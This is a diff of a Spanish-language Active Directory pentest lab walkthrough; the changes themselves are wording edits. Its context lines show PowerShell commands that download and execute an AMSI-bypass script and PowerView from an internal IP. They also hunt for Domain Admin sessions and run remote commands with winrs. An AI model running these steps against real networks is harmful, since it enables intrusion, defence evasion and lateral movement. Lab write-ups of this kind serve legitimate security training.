@@ -89,12 +89,12 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
 ```
 
-Ahora enumeraremos a todos aquellos usuarios logados en el dominio y si tienen sesiones activas ver en que maquina esta cada uno
+Ahora enumeraremos a todos aquellos usuarios logeados en el dominio y si tienen sesiones activas ver en que maquina esta cada uno
 ```shell
 Find-DomainUserLocation
 ```
 
-Viendo que hay una sesión de Domain Admin en el servidor *dcorp-mgmt* 
+Viendo que hay una sesión de Domain Admin en el servidor *dcorp-mgmt* y nosotros tener los privilegios de administrador local podemos intentar aprovecharnos 
 Vamos a probar a del cual nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
 ```shell
  winrs -r:dcorp-mgmt cmd /c "set computername && set username"
